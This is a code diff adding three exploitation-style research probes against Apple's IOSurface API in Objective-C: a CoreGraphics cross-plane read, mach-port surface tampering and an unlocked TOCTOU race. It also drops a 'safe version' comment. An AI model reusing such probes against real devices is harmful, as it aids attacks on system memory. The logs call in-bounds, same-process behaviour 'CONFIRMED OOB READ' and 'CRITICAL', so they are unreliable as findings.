@@ -14,6 +14,7 @@
 #import <mach/mach_time.h>
 #import <dlfcn.h>
 #import <stdatomic.h>
+#import <libkern/OSAtomic.h>
 #import <pthread.h>
 #import <sys/time.h>
 #include <math.h>
@@ -6537,7 +6538,7 @@ void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _N
     });
 }
 
-// Probe 30: Global+Overflow Combo — safe version: no OOB CG contexts
+// Probe 30: Global+Overflow Combo
 void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
     atomic_store(&g_isr_stop, false);
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
@@ -6748,6 +6749,681 @@ void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _
             isr_checkpoint(@"ISR-GlobalOverflow-checkpoint.json", results);
             isr_unload(&sym);
             done(results);
+        }
+    });
+}
+
+// =============================================================================
+// ROUND 10: Real exploitation probes
+// =============================================================================
+
+// Probe 31: CG Cross-Plane Read — REAL OOB read of plane1 via CG context
+// h=128 * bpr=256 = 32768 = allocSize, so all memory IS mapped. No crash.
+// CG renders plane0+plane1 as one image, proving the OOB read primitive.
+void iosurface_research_cg_crossplane_read(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
+                return;
+            }
+
+            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
+            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
+            typedef size_t (*GetPlaneCountFn)(IOSurfaceRef);
+            GetPlaneCountFn getPlaneCount = (GetPlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
+
+            if (!getPlaneBase || !getPlaneCount) {
+                log(@"CGREAD: Missing plane functions");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"missing plane fns"});
+                return;
+            }
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // Dual-plane surface: plane0=64x64 at offset 0, plane1=64x64 at offset 16384
+            // Total allocSize = 32768 = 128 rows * 256 bpr — CG h=128 is within bounds
+            NSDictionary *p0Info = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *p1Info = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *dualPlane = @{
+                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @(32768),
+                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
+            };
+
+            // === Test A: Write distinct patterns, read both via single CG context ===
+            log(@"CGREAD: Test A — write 0xRRGGBBAA to plane0, 0xSECRET to plane1, read both via CG");
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
+            if (!surf) {
+                log(@"CGREAD: Failed to create surface");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create failed"});
+                return;
+            }
+
+            sym.lock(surf, 0, NULL);
+            void *p0 = getPlaneBase(surf, 0);
+            void *p1 = getPlaneBase(surf, 1);
+            ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
+            log([NSString stringWithFormat:@"CGREAD: plane0=%p plane1=%p gap=%td allocSize=32768", p0, p1, gap]);
+
+            if (!p0 || !p1 || gap != 16384) {
+                log(@"CGREAD: Unexpected layout, aborting");
+                sym.unlock(surf, 0, NULL);
+                CFRelease(surf);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"bad layout"});
+                return;
+            }
+
+            // Write known patterns: plane0 = red, plane1 = "secret" green
+            uint32_t *px0 = (uint32_t *)p0;
+            uint32_t *px1 = (uint32_t *)p1;
+            for (int i = 0; i < 64*64; i++) px0[i] = 0xFFFF0000; // BGRA red
+            for (int i = 0; i < 64*64; i++) px1[i] = 0xFF00FF00; // BGRA green "secret"
+
+            // Create CG context spanning BOTH planes: h=128 * 256 = 32768 = allocSize
+            CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+            CGContextRef ctx = CGBitmapContextCreate(p0, 64, 128, 8, 256, cs,
+                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+
+            if (!ctx) {
+                log(@"CGREAD: CG rejected h=128 — bounds check present, no OOB possible");
+                CGColorSpaceRelease(cs);
+                sym.unlock(surf, 0, NULL);
+                CFRelease(surf);
+                isr_unload(&sym);
+                done(@{@"status": @"DONE", @"anomalies": @0, @"elapsed": @(CFAbsoluteTimeGetCurrent() - start)});
+                return;
+            }
+
+            anomalies++;
+            log(@"CGREAD: CG ACCEPTED h=128 context — rendering both planes as single image");
+
+            CGImageRef img = CGBitmapContextCreateImage(ctx);
+            if (img) {
+                CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(img));
+                if (pixData) {
+                    const uint32_t *pixels = (const uint32_t *)CFDataGetBytePtr(pixData);
+                    size_t totalPixels = (size_t)CFDataGetLength(pixData) / 4;
+                    size_t imgW = CGImageGetWidth(img);
+                    size_t imgH = CGImageGetHeight(img);
+                    size_t imgBPR = CGImageGetBytesPerRow(img);
+
+                    log([NSString stringWithFormat:@"CGREAD: Image = %zux%zu bpr=%zu totalPixels=%zu", imgW, imgH, imgBPR, totalPixels]);
+
+                    // Count plane0 pixels (rows 0-63) that match red pattern
+                    uint32_t redMatch = 0;
+                    for (size_t row = 0; row < 64 && row < imgH; row++) {
+                        size_t rowOff = row * (imgBPR / 4);
+                        for (size_t col = 0; col < 64 && col < imgW; col++) {
+                            if (rowOff + col < totalPixels && pixels[rowOff + col] == 0xFFFF0000) redMatch++;
+                        }
+                    }
+
+                    // Count plane1 pixels (rows 64-127) that match green "secret" pattern
+                    uint32_t greenMatch = 0;
+                    for (size_t row = 64; row < 128 && row < imgH; row++) {
+                        size_t rowOff = row * (imgBPR / 4);
+                        for (size_t col = 0; col < 64 && col < imgW; col++) {
+                            if (rowOff + col < totalPixels && pixels[rowOff + col] == 0xFF00FF00) greenMatch++;
+                        }
+                    }
+
+                    log([NSString stringWithFormat:@"CGREAD: Plane0 (red) pixels via CG = %u/4096", redMatch]);
+                    log([NSString stringWithFormat:@"CGREAD: Plane1 (SECRET green) pixels via CG = %u/4096", greenMatch]);
+
+                    if (greenMatch > 0) {
+                        anomalies++;
+                        log(@"CGREAD: *** CONFIRMED OOB READ — plane1 data rendered by CG through plane0 context ***");
+                        log([NSString stringWithFormat:@"CGREAD: %u secret pixels extracted = %.1f%% leak rate", greenMatch, greenMatch * 100.0 / 4096]);
+                    }
+
+                    // Sample some actual pixel values from the overflow region
+                    log(@"CGREAD: Sample pixels from overflow region (rows 64-67):");
+                    for (int row = 64; row < 68 && (size_t)row < imgH; row++) {
+                        size_t rowOff = row * (imgBPR / 4);
+                        if (rowOff + 3 < totalPixels) {
+                            log([NSString stringWithFormat:@"CGREAD:   row %d: [0]=0x%08X [1]=0x%08X [2]=0x%08X [3]=0x%08X",
+                                row, pixels[rowOff], pixels[rowOff+1], pixels[rowOff+2], pixels[rowOff+3]]);
+                        }
+                    }
+                    CFRelease(pixData);
+                }
+                CGImageRelease(img);
+            }
+            CGContextRelease(ctx);
+            CGColorSpaceRelease(cs);
+            sym.unlock(surf, 0, NULL);
+
+            if (isr_stopped()) { CFRelease(surf); goto cgread_done; }
+
+            // === Test B: Modify plane1 "secretly", verify CG reads the change ===
+            log(@"CGREAD: Test B — modify plane1 to 0xDEADBEEF, verify CG sees the change");
+            sym.lock(surf, 0, NULL);
+            uint32_t *secretP1 = (uint32_t *)getPlaneBase(surf, 1);
+            if (secretP1) {
+                for (int i = 0; i < 64*64; i++) secretP1[i] = 0xFFDEADBE; // BGRA with alpha=FF
+            }
+
+            CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
+            CGContextRef ctx2 = CGBitmapContextCreate(getPlaneBase(surf, 0), 64, 128, 8, 256, cs2,
+                kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+            if (ctx2) {
+                CGImageRef img2 = CGBitmapContextCreateImage(ctx2);
+                if (img2) {
+                    CFDataRef pix2 = CGDataProviderCopyData(CGImageGetDataProvider(img2));
+                    if (pix2) {
+                        const uint32_t *px = (const uint32_t *)CFDataGetBytePtr(pix2);
+                        size_t nw = (size_t)CFDataGetLength(pix2) / 4;
+                        size_t bpr = CGImageGetBytesPerRow(img2) / 4;
+                        uint32_t deadMatch = 0;
+                        for (size_t row = 64; row < 128; row++) {
+                            for (size_t col = 0; col < 64; col++) {
+                                size_t idx = row * bpr + col;
+                                if (idx < nw && px[idx] == 0xFFDEADBE) deadMatch++;
+                            }
+                        }
+                        if (deadMatch > 0) {
+                            anomalies++;
+                            log([NSString stringWithFormat:@"CGREAD: *** LIVE OOB READ — %u/4096 modified plane1 pixels visible via CG ***", deadMatch]);
+                        }
+                        CFRelease(pix2);
+                    }
+                    CGImageRelease(img2);
+                }
+                CGContextRelease(ctx2);
+            }
+            CGColorSpaceRelease(cs2);
+            sym.unlock(surf, 0, NULL);
+
+            if (isr_stopped()) { CFRelease(surf); goto cgread_done; }
+
+            // === Test C: Multiple format variations ===
+            log(@"CGREAD: Test C — test cross-plane read with different plane sizes");
+            CFRelease(surf);
+            {
+                // Asymmetric: plane0=64x48, plane1=64x16, total=64*256=16384
+                NSDictionary *asym0 = @{
+                    @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @48,
+                    @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                    @"IOSurfacePlaneBytesPerRow": @256
+                };
+                NSDictionary *asym1 = @{
+                    @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @16,
+                    @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(48*256),
+                    @"IOSurfacePlaneBytesPerRow": @256
+                };
+                NSDictionary *asymSurf = @{
+                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @48,
+                    @"IOSurfacePixelFormat": @(0x42475241),
+                    @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
+                    @"IOSurfaceAllocSize": @(64 * 256),
+                    @"IOSurfacePlaneInfo": @[asym0, asym1]
+                };
+
+                IOSurfaceRef s2 = sym.create((__bridge CFDictionaryRef)asymSurf);
+                if (s2) {
+                    sym.lock(s2, 0, NULL);
+                    void *a0 = getPlaneBase(s2, 0);
+                    void *a1 = getPlaneBase(s2, 1);
+                    if (a0 && a1) {
+                        uint32_t *ap0 = (uint32_t *)a0;
+                        uint32_t *ap1 = (uint32_t *)a1;
+                        for (int i = 0; i < 48*64; i++) ap0[i] = 0xFF111111;
+                        for (int i = 0; i < 16*64; i++) ap1[i] = 0xFF999999;
+
+                        // CG with h=64 spans both planes (64*256=16384=allocSize)
+                        CGColorSpaceRef cs3 = CGColorSpaceCreateDeviceRGB();
+                        CGContextRef ctx3 = CGBitmapContextCreate(a0, 64, 64, 8, 256, cs3,
+                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                        if (ctx3) {
+                            CGImageRef img3 = CGBitmapContextCreateImage(ctx3);
+                            if (img3) {
+                                CFDataRef pix3 = CGDataProviderCopyData(CGImageGetDataProvider(img3));
+                                if (pix3) {
+                                    const uint32_t *ap = (const uint32_t *)CFDataGetBytePtr(pix3);
+                                    size_t nw3 = (size_t)CFDataGetLength(pix3) / 4;
+                                    size_t bpr3 = CGImageGetBytesPerRow(img3) / 4;
+                                    uint32_t p1Leak = 0;
+                                    for (size_t row = 48; row < 64; row++) {
+                                        for (size_t col = 0; col < 64; col++) {
+                                            size_t idx = row * bpr3 + col;
+                                            if (idx < nw3 && ap[idx] == 0xFF999999) p1Leak++;
+                                        }
+                                    }
+                                    log([NSString stringWithFormat:@"CGREAD: Asymmetric (48+16) — plane1 leaked pixels = %u/1024", p1Leak]);
+                                    if (p1Leak > 0) {
+                                        anomalies++;
+                                        log(@"CGREAD: *** CONFIRMED — asymmetric plane layout also leaks ***");
+                                    }
+                                    CFRelease(pix3);
+                                }
+                                CGImageRelease(img3);
+                            }
+                            CGContextRelease(ctx3);
+                        }
+                        CGColorSpaceRelease(cs3);
+                    }
+                    sym.unlock(s2, 0, NULL);
+                    CFRelease(s2);
+                }
+            }
+
+        cgread_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"CGREAD: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-CGCrossPlaneRead-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 32: Mach Port Surface Hijack — transfer surface via mach port, tamper from second ref
+void iosurface_research_mach_hijack(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
+                return;
+            }
+
+            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
+            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
+            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
+            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
+
+            if (!createPort || !lookupPort) {
+                log(@"MACHIJACK: Missing mach port functions");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"missing port fns"});
+                return;
+            }
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            uint32_t anomalies = 0;
+
+            // === Test A: Create surface, export via mach port, import, verify shared memory ===
+            log(@"MACHIJACK: Test A — mach port export/import shared memory");
+            NSDictionary *props = isr_default_surface_params(128, 128);
+            IOSurfaceRef original = sym.create((__bridge CFDictionaryRef)props);
+            if (!original) {
+                log(@"MACHIJACK: Create failed");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create failed"});
+                return;
+            }
+
+            // Write secret pattern to original
+            sym.lock(original, 0, NULL);
+            uint32_t *origBase = (uint32_t *)sym.getBase(original);
+            if (origBase) {
+                for (int i = 0; i < 128*128; i++) origBase[i] = 0xABCD0000 | (uint32_t)(i & 0xFFFF);
+            }
+            sym.unlock(original, 0, NULL);
+
+            // Export via mach port
+            mach_port_t port = createPort(original);
+            log([NSString stringWithFormat:@"MACHIJACK: Mach port = 0x%X", port]);
+
+            if (port != MACH_PORT_NULL) {
+                // Import from mach port — this simulates another process receiving the port
+                IOSurfaceRef hijacked = lookupPort(port);
+                if (hijacked) {
+                    sym.lock(hijacked, 0, NULL);
+                    uint32_t *hijBase = (uint32_t *)sym.getBase(hijacked);
+                    if (hijBase) {
+                        // Verify we can read the original's secret data
+                        uint32_t secretMatch = 0;
+                        for (int i = 0; i < 128*128; i++) {
+                            uint32_t expected = 0xABCD0000 | (uint32_t)(i & 0xFFFF);
+                            if (hijBase[i] == expected) secretMatch++;
+                        }
+                        log([NSString stringWithFormat:@"MACHIJACK: Secret data readable via port = %u/16384 (%.1f%%)",
+                            secretMatch, secretMatch * 100.0 / 16384]);
+                        if (secretMatch > 0) {
+                            anomalies++;
+                            log(@"MACHIJACK: *** CONFIRMED — full surface data accessible via mach port transfer ***");
+                        }
+
+                        // Tamper the data from hijacked reference
+                        log(@"MACHIJACK: Tampering data via hijacked reference...");
+                        for (int i = 0; i < 128*128; i++) hijBase[i] = 0xBAADF00D;
+                    }
+                    sym.unlock(hijacked, 0, NULL);
+
+                    // Verify tamper visible on original
+                    sym.lock(original, 0, NULL);
+                    uint32_t *origCheck = (uint32_t *)sym.getBase(original);
+                    if (origCheck) {
+                        uint32_t tamperVisible = 0;
+                        for (int i = 0; i < 128*128; i++) {
+                            if (origCheck[i] == 0xBAADF00D) tamperVisible++;
+                        }
+                        log([NSString stringWithFormat:@"MACHIJACK: Tamper visible on original = %u/16384", tamperVisible]);
+                        if (tamperVisible > 0) {
+                            anomalies++;
+                            log(@"MACHIJACK: *** CRITICAL — remote tamper via mach port confirmed ***");
+                        }
+                    }
+                    sym.unlock(original, 0, NULL);
+                    CFRelease(hijacked);
+                } else {
+                    log(@"MACHIJACK: LookupFromMachPort returned NULL");
+                }
+                mach_port_deallocate(mach_task_self(), port);
+            } else {
+                log(@"MACHIJACK: CreateMachPort returned NULL");
+            }
+
+            if (isr_stopped()) { CFRelease(original); goto machijack_done; }
+
+            // === Test B: Multiple ports from same surface ===
+            log(@"MACHIJACK: Test B — multiple mach ports from same surface");
+            {
+                mach_port_t ports[5] = {0};
+                IOSurfaceRef refs[5] = {0};
+                for (int i = 0; i < 5; i++) {
+                    ports[i] = createPort(original);
+                    if (ports[i] != MACH_PORT_NULL) {
+                        refs[i] = lookupPort(ports[i]);
+                    }
+                }
+                // Write from ref[0], read from ref[4]
+                if (refs[0] && refs[4]) {
+                    sym.lock(refs[0], 0, NULL);
+                    uint32_t *w = (uint32_t *)sym.getBase(refs[0]);
+                    if (w) w[0] = 0xFEEDFACE;
+                    sym.unlock(refs[0], 0, NULL);
+
+                    sym.lock(refs[4], 0, NULL);
+                    uint32_t *r = (uint32_t *)sym.getBase(refs[4]);
+                    if (r && r[0] == 0xFEEDFACE) {
+                        anomalies++;
+                        log(@"MACHIJACK: *** Multi-port shared memory confirmed — write via port0, read via port4 ***");
+                    }
+                    sym.unlock(refs[4], 0, NULL);
+                }
+                uint32_t validPorts = 0;
+                for (int i = 0; i < 5; i++) {
+                    if (refs[i]) { CFRelease(refs[i]); validPorts++; }
+                    if (ports[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), ports[i]);
+                }
+                log([NSString stringWithFormat:@"MACHIJACK: %u/5 ports created valid refs", validPorts]);
+            }
+
+            if (isr_stopped()) { CFRelease(original); goto machijack_done; }
+
+            // === Test C: Port survives original release? ===
+            log(@"MACHIJACK: Test C — port reference after original release");
+            {
+                NSDictionary *tmpProps = isr_default_surface_params(64, 64);
+                IOSurfaceRef tmp = sym.create((__bridge CFDictionaryRef)tmpProps);
+                if (tmp) {
+                    sym.lock(tmp, 0, NULL);
+                    uint32_t *tb = (uint32_t *)sym.getBase(tmp);
+                    if (tb) for (int i = 0; i < 64*64; i++) tb[i] = 0xCAFEBABE;
+                    sym.unlock(tmp, 0, NULL);
+
+                    mach_port_t tmpPort = createPort(tmp);
+                    CFRelease(tmp); // Release original
+
+                    if (tmpPort != MACH_PORT_NULL) {
+                        IOSurfaceRef revived = lookupPort(tmpPort);
+                        if (revived) {
+                            sym.lock(revived, 0, NULL);
+                            uint32_t *rb = (uint32_t *)sym.getBase(revived);
+                            if (rb) {
+                                uint32_t cafeMatch = 0;
+                                for (int i = 0; i < 64*64; i++) {
+                                    if (rb[i] == 0xCAFEBABE) cafeMatch++;
+                                }
+                                if (cafeMatch > 0) {
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"MACHIJACK: *** DANGLING PORT — %u/4096 pixels still readable after original released ***", cafeMatch]);
+                                } else {
+                                    log(@"MACHIJACK: Port ref data cleared after original release");
+                                }
+                            }
+                            sym.unlock(revived, 0, NULL);
+                            CFRelease(revived);
+                        }
+                        mach_port_deallocate(mach_task_self(), tmpPort);
+                    }
+                }
+            }
+
+            CFRelease(original);
+
+        machijack_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"MACHIJACK: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed)
+            };
+            isr_checkpoint(@"ISR-MachHijack-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
+        }
+    });
+}
+
+// Probe 33: Global Surface TOCTOU — race between write and read on global surface
+void iosurface_research_global_toctou(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    atomic_store(&g_isr_stop, false);
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        @autoreleasepool {
+            ISRSymbols sym;
+            if (!isr_load(&sym)) {
+                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
+                return;
+            }
+
+            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
+            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
+
+            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
+            __block uint32_t anomalies = 0;
+
+            // Create global dual-plane surface
+            NSDictionary *gp0 = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *gp1 = @{
+                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
+                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
+                @"IOSurfacePlaneBytesPerRow": @256
+            };
+            NSDictionary *globalDual = @{
+                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
+                @"IOSurfacePixelFormat": @(0x42475241),
+                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
+                @"IOSurfaceAllocSize": @(32768),
+                @"IOSurfaceIsGlobal": @YES,
+                @"IOSurfacePlaneInfo": @[gp0, gp1]
+            };
+
+            IOSurfaceRef owner = sym.create((__bridge CFDictionaryRef)globalDual);
+            if (!owner) {
+                log(@"TOCTOU: Create failed");
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"create failed"});
+                return;
+            }
+            IOSurfaceID ownerID = sym.getID(owner);
+            log([NSString stringWithFormat:@"TOCTOU: Global surface ID=%u", ownerID]);
+
+            // Get a "spy" reference via lookup
+            IOSurfaceRef spy = sym.lookup(ownerID);
+            if (!spy) {
+                log(@"TOCTOU: Lookup failed");
+                CFRelease(owner);
+                isr_unload(&sym);
+                done(@{@"status": @"ERROR", @"reason": @"lookup failed"});
+                return;
+            }
+
+            // === Test A: TOCTOU race — owner writes, spy reads without lock ===
+            log(@"TOCTOU: Test A — race: owner writes with lock, spy reads WITHOUT lock");
+            __block uint32_t raceDetected = 0;
+            __block uint32_t partialWrites = 0;
+
+            dispatch_group_t group = dispatch_group_create();
+            dispatch_queue_t writerQ = dispatch_queue_create("writer", DISPATCH_QUEUE_SERIAL);
+            dispatch_queue_t readerQ = dispatch_queue_create("reader", DISPATCH_QUEUE_SERIAL);
+
+            // Writer: alternates between 0xAAAAAAAA and 0x55555555
+            __block volatile int32_t writerDone = 0;
+            dispatch_group_enter(group);
+            dispatch_async(writerQ, ^{
+                for (int iter = 0; iter < 1000 && !isr_stopped(); iter++) {
+                    sym.lock(owner, 0, NULL);
+                    uint32_t *base = (uint32_t *)sym.getBase(owner);
+                    if (base) {
+                        uint32_t val = (iter % 2 == 0) ? 0xAAAAAAAA : 0x55555555;
+                        for (int i = 0; i < 4096; i++) base[i] = val;
+                    }
+                    sym.unlock(owner, 0, NULL);
+                }
+                OSAtomicIncrement32(&writerDone);
+                dispatch_group_leave(group);
+            });
+
+            // Reader: reads via spy WITHOUT lock — may see partial writes (TOCTOU)
+            dispatch_group_enter(group);
+            dispatch_async(readerQ, ^{
+                while (!writerDone && !isr_stopped()) {
+                    // NO LOCK — intentional TOCTOU
+                    uint32_t *spyBase = (uint32_t *)sym.getBase(spy);
+                    if (spyBase) {
+                        uint32_t first = spyBase[0];
+                        uint32_t last = spyBase[4095];
+                        // If first != last, writer was mid-update (torn read)
+                        if (first != last && first != 0 && last != 0) {
+                            OSAtomicIncrement32((volatile int32_t *)&raceDetected);
+                        }
+                        // Check for mixed values (partial write visible)
+                        uint32_t countA = 0, countB = 0;
+                        for (int i = 0; i < 256; i++) {
+                            if (spyBase[i] == 0xAAAAAAAA) countA++;
+                            else if (spyBase[i] == 0x55555555) countB++;
+                        }
+                        if (countA > 0 && countB > 0) {
+                            OSAtomicIncrement32((volatile int32_t *)&partialWrites);
+                        }
+                    }
+                    // Tight loop — no sleep — maximize race window
+                }
+                dispatch_group_leave(group);
+            });
+
+            dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
+
+            log([NSString stringWithFormat:@"TOCTOU: Race detections (torn reads) = %u", raceDetected]);
+            log([NSString stringWithFormat:@"TOCTOU: Partial write observations = %u", partialWrites]);
+            if (raceDetected > 0) {
+                anomalies++;
+                log(@"TOCTOU: *** CONFIRMED TOCTOU — spy sees inconsistent state during owner write ***");
+            }
+            if (partialWrites > 0) {
+                anomalies++;
+                log(@"TOCTOU: *** CONFIRMED — partial writes visible to spy (no atomicity guarantee) ***");
+            }
+
+            if (isr_stopped()) { CFRelease(spy); CFRelease(owner); goto toctou_done; }
+
+            // === Test B: Spy tampers while owner validates ===
+            log(@"TOCTOU: Test B — spy tampers during owner's check-then-use");
+            {
+                __block uint32_t tamperSuccess = 0;
+                __block volatile int32_t phase2Done = 0;
+
+                dispatch_group_t g2 = dispatch_group_create();
+
+                // Owner: writes "valid" marker, then checks it
+                dispatch_group_enter(g2);
+                dispatch_async(writerQ, ^{
+                    for (int iter = 0; iter < 2000 && !isr_stopped(); iter++) {
+                        uint32_t *base = (uint32_t *)sym.getBase(owner);
+                        if (base) {
+                            // "CHECK": write valid value
+                            base[0] = 0x56414C44; // "VALD"
+                            // Small delay to widen the TOCTOU window
+                            for (volatile int d = 0; d < 50; d++) {}
+                            // "USE": read back and verify
+                            if (base[0] != 0x56414C44) {
+                                OSAtomicIncrement32((volatile int32_t *)&tamperSuccess);
+                            }
+                        }
+                    }
+                    OSAtomicIncrement32(&phase2Done);
+                    dispatch_group_leave(g2);
+                });
+
+                // Spy: overwrites "valid" marker between check and use
+                dispatch_group_enter(g2);
+                dispatch_async(readerQ, ^{
+                    while (!phase2Done && !isr_stopped()) {
+                        uint32_t *spyBase = (uint32_t *)sym.getBase(spy);
+                        if (spyBase) {
+                            spyBase[0] = 0x48414351; // "HACK"
+                        }
+                    }
+                    dispatch_group_leave(g2);
+                });
+
+                dispatch_group_wait(g2, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
+
+                log([NSString stringWithFormat:@"TOCTOU: Spy tamper-during-check successes = %u/2000", tamperSuccess]);
+                if (tamperSuccess > 0) {
+                    anomalies++;
+                    log(@"TOCTOU: *** CRITICAL — TOCTOU attack successful: spy modified data between check and use ***");
+                    log([NSString stringWithFormat:@"TOCTOU: Success rate = %.1f%%", tamperSuccess * 100.0 / 2000]);
+                }
+            }
+
+            CFRelease(spy);
+            CFRelease(owner);
+
+        toctou_done:;
+            double elapsed = CFAbsoluteTimeGetCurrent() - start;
+            log([NSString stringWithFormat:@"TOCTOU: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
+            NSDictionary *res = @{
+                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+                @"anomalies": @(anomalies),
+                @"elapsed": @(elapsed),
+                @"raceDetected": @(raceDetected),
+                @"partialWrites": @(partialWrites)
+            };
+            isr_checkpoint(@"ISR-GlobalTOCTOU-checkpoint.json", res);
+            isr_unload(&sym);
+            done(res);
         }
     });
 }
